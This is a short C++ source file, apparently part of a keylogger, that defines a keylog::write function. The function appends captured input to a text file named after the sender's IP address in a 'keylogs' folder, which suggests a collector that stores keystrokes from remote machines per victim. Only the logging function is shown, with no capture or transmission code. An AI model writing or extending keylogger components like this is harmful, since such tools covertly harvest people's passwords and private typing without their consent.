#include "keylog.h"

void keylog::write(std::string& input, std::string IP)
{
	std::fstream ofile;
	ofile.open("keylogs\\" + IP + ".txt", std::fstream::out | std::fstream::app);

	ofile << input;
	ofile.close();
}
